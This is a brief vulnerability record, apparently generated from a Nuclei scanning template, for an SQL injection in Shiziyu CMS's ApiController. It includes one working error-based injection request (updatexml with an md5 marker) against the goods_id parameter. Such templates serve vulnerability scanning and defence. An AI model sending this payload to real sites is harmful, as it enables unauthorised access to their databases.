# Vulnerability: Shiziyu CMS Api Controller - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`shiziyu-cms-apicontroller-sqli.yaml`)

## Description
Shiziyu CMS ApiController.class.php parameter filtering is not rigorous, resulting in SQL injection vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)
```

